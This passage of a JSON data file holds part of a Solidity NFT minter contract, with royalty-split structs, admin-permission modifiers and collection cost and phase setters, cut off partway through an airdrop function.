royaltiesPrimarySplits) private collectionRoyaltiesPrimarySplits;\n\n    // artists primary Addresses\n    struct collectionPrimaryAddresses {\n        address primaryAdd1;\n        address primaryAdd2;\n        address primaryAdd3;\n        uint256 add1Percentage;\n        uint256 add2Percentage;\n        uint256 add3Percentage;\n        bool status;\n    }\n\n    // mapping of collectionPrimaryAndSecondaryAddresses struct\n    mapping (uint256 => collectionPrimaryAddresses) private collectionArtistPrimaryAddresses;\n\n    // royalties secondary splits structure\n\n    struct royaltiesSecondarySplits {\n        uint256 artistPercentage;\n        uint256 teamPercentage;\n    }\n\n    // mapping of royaltiesSecondarySplits struct\n\n    mapping (uint256 => royaltiesSecondarySplits) private collectionRoyaltiesSecondarySplits;\n\n    // artists secondary Addresses\n    struct collectionSecondaryAddresses {\n        address secondaryAdd1;\n        address secondaryAdd2;\n        address secondaryAdd3;\n        uint256 add1Percentage;\n        uint256 add2Percentage;\n        uint256 add3Percentage;\n        bool status;\n    }\n\n    // mapping of collectionSecondaryAddresses struct\n    mapping (uint256 => collectionSecondaryAddresses) private collectionArtistSecondaryAddresses;\n\n    // mapping of token id and auction end time\n    mapping (uint256 => uint) private mintToAuctionData;\n\n    // mapping of token id and status\n    mapping (uint256 => bool) private mintToAuctionStatus;\n\n    //external contracts declaration\n    INextGenCore public gencore;\n    IDelegationManagementContract private dmc;\n    INextGenAdmins private adminsContract;\n\n    // events\n\n    event PayArtist(address indexed _add, bool status, uint256 indexed funds);\n    event PayTeam(address indexed _add, bool status, uint256 indexed funds);\n    event Withdraw(address indexed _add, bool status, uint256 indexed funds);\n\n    // constructor\n    constructor (address _gencore, address _del, address _adminsContract) {\n        gencore = INextGenCore(_gencore);\n        dmc = IDelegationManagementContract(_del);\n        adminsContract = INextGenAdmins(_adminsContract);\n    }\n\n    // certain functions can only be called by an admin or the artist\n    modifier ArtistOrAdminRequired(uint256 _collectionID, bytes4 _selector) {\n      require(msg.sender == gencore.retrieveArtistAddress(_collectionID) || adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true, \"Not allowed\");\n      _;\n    }\n\n    // certain functions can only be called by a global or function admin\n\n    modifier FunctionAdminRequired(bytes4 _selector) {\n      require(adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true , \"Not allowed\");\n      _;\n    }\n\n    // certain functions can only be called by a collection, global or function admin\n\n    modifier CollectionAdminRequired(uint256 _collectionID, bytes4 _selector) {\n      require(adminsContract.retrieveCollectionAdmin(msg.sender,_collectionID) == true || adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true, \"Not allowed\");\n      _;\n    }\n\n    // function to add a collection's minting costs\n\n    function setCollectionCosts(uint256 _collectionID, uint256 _collectionMintCost, uint256 _collectionEndMintCost, uint256 _rate, uint256 _timePeriod, uint8 _salesOption, address _delAddress) public CollectionAdminRequired(_collectionID, this.setCollectionCosts.selector) {\n        require(gencore.retrievewereDataAdded(_collectionID) == true, \"Add data\");\n        collectionPhases[_collectionID].collectionMintCost = _collectionMintCost;\n        collectionPhases[_collectionID].collectionEndMintCost = _collectionEndMintCost;\n        collectionPhases[_collectionID].rate = _rate;\n        collectionPhases[_collectionID].timePeriod = _timePeriod;\n        collectionPhases[_collectionID].salesOption = _salesOption;\n        collectionPhases[_collectionID].delAddress = _delAddress;\n        setMintingCosts[_collectionID] = true;\n    }\n\n    // function to add a collection's start/end times and merkleroot\n\n    function setCollectionPhases(uint256 _collectionID, uint _allowlistStartTime, uint _allowlistEndTime, uint _publicStartTime, uint _publicEndTime, bytes32 _merkleRoot) public CollectionAdminRequired(_collectionID, this.setCollectionPhases.selector) {\n        require(setMintingCosts[_collectionID] == true, \"Set Minting Costs\");\n        collectionPhases[_collectionID].allowlistStartTime = _allowlistStartTime;\n        collectionPhases[_collectionID].allowlistEndTime = _allowlistEndTime;\n        collectionPhases[_collectionID].merkleRoot = _merkleRoot;\n        collectionPhases[_collectionID].publicStartTime = _publicStartTime;\n        collectionPhases[_collectionID].publicEndTime = _publicEndTime;\n    }\n\n    // airdrop function\n    \n    function airDropTokens(address[] memory _recipients, string[] memory _tokenData, uint256[] memory _saltfun_o, uint256 _collectionID, uint256[] memory _numberOfTokens) public FunctionAdminRequired(this.airDropTokens.selector) {\n        require(gencore.retrievewereDataAdded(_collectionID) == true, \"Add data\");\n        uint256 collectionTokenMintIndex;\n        for (uint256 y=0; y< _recipients.length; y++) {\n            collectionTokenMintIndex = gencore.viewTokensIndexMin(_collectionID) + gencore.viewCirSupply(_collectionID) + _numberOfTokens[y] - 1;\n            require(collectionTokenMintIndex <= gencore.viewTokensIndexMax(_collectionID), \""
    }
  ]
}